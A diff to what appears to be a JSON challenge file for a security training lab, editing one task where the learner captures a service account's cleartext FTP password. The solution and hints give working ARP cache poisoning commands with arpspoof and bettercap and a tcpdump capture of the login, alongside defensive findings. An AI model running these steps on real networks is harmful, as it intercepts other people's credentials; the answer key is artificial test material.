@@ -281,7 +281,7 @@
       "answer": null,
       "answer_variable_name": "sync_password",
       "content": "You have a shell on the file server. Look at what arrives on it on a schedule - the landing directory for the transfer job has operational notes in it, and the FTP log records every time the job runs.\n\nThe job authenticates as a service account. That account's password is not written down anywhere you can reach: not on the file server, not on the workstation in any file you can read, and not in the ticket system. It exists in readable form in exactly one place - on the wire, once a minute, because the job still uses FTP.\n\nGet yourself into a position to read it, and submit the password.",
-      "solution": "* Find the schedule from the foothold:\n\n```\ncat /srv/sync/sync-notes.txt\ngrep svc_sync /var/log/vsftpd.log | tail\n```\n\nThe notes name `svc_sync` and say the credential is held on `ws01` and deliberately not copied to the file server. The log shows the login landing roughly once a minute from `192.168.60.40`.\n\n* You cannot read it off either host - it is a hashed system password on both ends. So put yourself between them. From your assessment machine, poison both ARP caches so the two hosts send their traffic to you:\n\n```\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo bettercap -iface eth0 -eval \"set arp.spoof.targets 192.168.60.40,192.168.60.30; arp.spoof on; net.sniff on\"\n```\n\n`arpspoof` does the same job if you prefer it - one instance per direction:\n\n```\nsudo arpspoof -i eth0 -t 192.168.60.40 192.168.60.30\nsudo arpspoof -i eth0 -t 192.168.60.30 192.168.60.40\n```\n\n* Capture the control channel and wait for the next run:\n\n```\nsudo tcpdump -i eth0 -A -s0 'tcp port 21 and host 192.168.60.40'\n```\n\nWithin a minute you will see the login in plain text:\n\n```\nUSER svc_sync\nPASS <the password>\n```\n\n* Stop spoofing when you are done so the caches recover.\n\n* Three findings stack up here: a service account authenticating over a cleartext protocol, no switch-level protection against ARP poisoning (the handover note admits there is no dynamic ARP inspection and no 802.1X), and a migration ticket that has been open for two years.\n\nPassword: ${ANSWER}",
+      "solution": "* Find the schedule from the foothold:\n\n```\ncat /srv/sync/sync-notes.txt\ngrep svc_sync /var/log/vsftpd.log | tail\n```\n\nThe notes name `svc_sync` and say the credential is held on `ws01` and deliberately not copied to the file server. The log shows the login landing roughly once a minute from `192.168.60.40`.\n\n* You cannot read it off either host - it is a hashed system password on both ends. So put yourself between them. From your assessment machine, poison both ARP caches so the two hosts send their traffic to you. Enable forwarding first, or you will black-hole the traffic you are trying to read:\n\n```\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo arpspoof -i eth0 -t 192.168.60.40 192.168.60.30\nsudo arpspoof -i eth0 -t 192.168.60.30 192.168.60.40\n```\n\nOne instance per direction, each in its own shell. If `bettercap` is on the box you met it in Module 3 and it does the same job in one command:\n\n```\nsudo bettercap -iface eth0 -eval \"set arp.spoof.targets 192.168.60.40,192.168.60.30; arp.spoof on; net.sniff on\"\n```\n\n* Capture the control channel and wait for the next run:\n\n```\nsudo tcpdump -i eth0 -A -s0 'tcp port 21 and host 192.168.60.40'\n```\n\nWithin a minute you will see the login in plain text:\n\n```\nUSER svc_sync\nPASS <the password>\n```\n\n* Stop spoofing when you are done so the caches recover.\n\n* Three findings stack up here: a service account authenticating over a cleartext protocol, no switch-level protection against ARP poisoning (the handover note admits there is no dynamic ARP inspection and no 802.1X), and a migration ticket that has been open for two years.\n\nPassword: ${ANSWER}",
       "solution_penalized": true,
       "hints": [
         {
@@ -298,7 +298,7 @@
         },
         {
           "title": "Getting on-path",
-          "content": "This is the Module 3 technique. Enable IP forwarding first or you will black-hole the traffic you are trying to read, then poison both directions - the workstation's entry for the server and the server's entry for the workstation - and sniff TCP port 21.",
+          "content": "This is the Module 3 technique, with arpspoof from dsniff. Enable IP forwarding first or you will black-hole the traffic you are trying to read, then poison both directions - the workstation's entry for the server and the server's entry for the workstation - and sniff TCP port 21.",
           "hint_penalty": 3,
           "order": 2
         }
@@ -323,8 +323,8 @@
         }
       ],
       "expected_commands": [
-        "bettercap",
         "arpspoof",
+        "bettercap",
         "tcpdump"
       ],
       "commands_required": false
